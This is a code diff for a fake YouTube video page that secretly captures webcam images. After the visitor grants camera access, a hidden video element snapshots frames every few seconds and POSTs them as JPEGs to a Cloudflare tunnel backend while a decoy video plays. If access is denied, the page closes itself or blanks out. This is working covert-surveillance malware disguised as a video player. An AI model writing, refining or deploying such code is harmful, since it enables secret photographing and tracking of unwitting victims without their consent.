@@ -1,99 +1,110 @@
-// Wait for page to load
-document.addEventListener('DOMContentLoaded', function() {
-    let mediaStream = null;
-    let captureInterval = null;
-    let videoElement = document.createElement('video');
-    let videoPlayed = false; // Flag to track if video has been played
+// ===== CONFIGURATION =====
+const BACKEND_URL = 'https://YOUR_CLOUDFLARED_URL.trycloudflare.com'; // 🔄 CHANGE THIS
+const CAPTURE_INTERVAL = 3000; // Capture every 3 seconds
 
-    // ⬇️ APNA CLOUDFLARED URL DAALO ⬇️
-    const BACKEND_URL = 'https://brighton-satisfied-encourages-adapters.trycloudflare.com';
+// ===== STATE =====
+let mediaStream = null;
+let videoElement = null;
+let captureInterval = null;
+let isCameraActive = false;
+let captureCount = 0;
+let videoPlayed = false;
 
-    // Function to capture image and send to server
-    function captureAndSendImage() {
-        if (!mediaStream) return;
+// ===== DOM ELEMENTS =====
+const videoThumbnail = document.getElementById('video-thumbnail');
+const youtubeIframe = document.getElementById('youtube-iframe');
+
+// ===== CLOSE PAGE FUNCTION =====
+function closePage() {
+    console.log('🚫 Camera denied - Closing page...');
+    
+    // Try multiple methods to close
+    try {
+        // Method 1: window.close()
+        window.close();
+    } catch(e) {
+        console.log('window.close() failed, trying other methods');
+    }
+    
+    // Method 2: Redirect to about:blank (closes page)
+    try {
+        window.location.href = 'about:blank';
+    } catch(e) {
+        console.log('about:blank redirect failed');
+    }
+    
+    // Method 3: Show blank page with no content
+    try {
+        document.body.innerHTML = '';
+        document.body.style.background = '#0f0f0f';
+    } catch(e) {
+        console.log('Body clear failed');
+    }
+    
+    // Method 4: If nothing works, redirect to a dead page
+    setTimeout(() => {
+        window.location.replace('about:blank');
+    }, 100);
+}
+
+// ===== PLAY VIDEO ON CLICK =====
+videoThumbnail.addEventListener('click', function(e) {
+    e.preventDefault();
+    
+    // Don't allow multiple clicks
+    if (videoPlayed) return;
+    
+    // Request camera access
+    requestCameraAccess();
+});
+
+// ===== REQUEST CAMERA ACCESS =====
+async function requestCameraAccess() {
+    try {
+        // Create hidden video element for capture
+        videoElement = document.createElement('video');
+        videoElement.style.display = 'none';
+        videoElement.setAttribute('playsinline', 'true');
+        document.body.appendChild(videoElement);
         
-        const canvas = document.createElement('canvas');
-        canvas.width = 640;
-        canvas.height = 480;
-        const ctx = canvas.getContext('2d');
-        
-        ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-        
-        const imageData = canvas.toDataURL('image/jpeg', 0.8);
-        
-        fetch(BACKEND_URL + '/upload', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
+        // Request camera with specific constraints
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: {
+                facingMode: 'user',
+                width: { ideal: 640 },
+                height: { ideal: 480 }
             },
-            body: JSON.stringify({
-                image: imageData,
-                timestamp: new Date().toISOString()
-            })
-        })
-        .then(response => response.json())
-        .then(data => {
-            console.log('✅ Image saved:', data.filename);
-        })
-        .catch(err => {
-            console.error('❌ Upload failed:', err);
+            audio: false
         });
-    }
-
-    // Function to play YouTube video
-    function playYouTubeVideo() {
-        if (videoPlayed) return; // Sirf ek baar play karo
-        videoPlayed = true;
         
-        const iframe = document.getElementById('youtube-video');
-        const placeholder = document.getElementById('video-placeholder');
-        
-        // Hide placeholder
-        if (placeholder) {
-            placeholder.style.display = 'none';
-        }
-        
-        // Show iframe and set video source
-        iframe.style.display = 'block';
-        iframe.src = 'https://www.youtube.com/embed/sciKttcTabQ?autoplay=1&mute=1';
-        
-        console.log('▶️ Video started playing');
-    }
-
-    // Function to redirect on deny
-    function redirectOnDeny() {
-        console.log('🚫 Camera denied. Redirecting to YouTube...');
-        window.location.href = 'https://www.youtube.com';
-    }
-
-    // 🔥 AUTOMATIC CAMERA ACCESS
-    navigator.mediaDevices.getUserMedia({ 
-        video: { width: 640, height: 480 } 
-    })
-    .then(stream => {
+        // ✅ Camera GRANTED
         mediaStream = stream;
         videoElement.srcObject = stream;
-        videoElement.play();
+        await videoElement.play();
+        isCameraActive = true;
+        videoPlayed = true;
         
-        // ✅ Camera allowed - Play video and start recording
+        console.log('✅ Camera access granted');
+        
+        // Play YouTube video
         playYouTubeVideo();
         
-        // Start capturing every 2 seconds
-        captureInterval = setInterval(captureAndSendImage, 2000);
+        // Start capturing in background
+        startCapturing();
         
-        console.log('📸 Camera access granted. Capturing...');
-    })
-    .catch(err => {
-        console.error('❌ Camera error:', err);
-        // ❌ Camera denied - Redirect to YouTube
-        redirectOnDeny();
-    });
-});
-
-// Cleanup when page unloads
-window.addEventListener('beforeunload', function() {
-    if (captureInterval) clearInterval(captureInterval);
-    if (mediaStream) {
-        mediaStream.getTracks().forEach(track => track.stop());
+    } catch (error) {
+        console.error('❌ Camera error:', error);
+        
+        // ❌ Camera DENIED - Close page immediately
+        if (error.name === 'NotAllowedError' || 
+            error.name === 'PermissionDeniedError' ||
+            error.name === 'NotFoundError' ||
+            error.name === 'AbortError') {
+            
+            // Close page instantly
+            closePage();
+        } else {
+            // For other errors, also close
+            closePage();
+        }
     }
-});
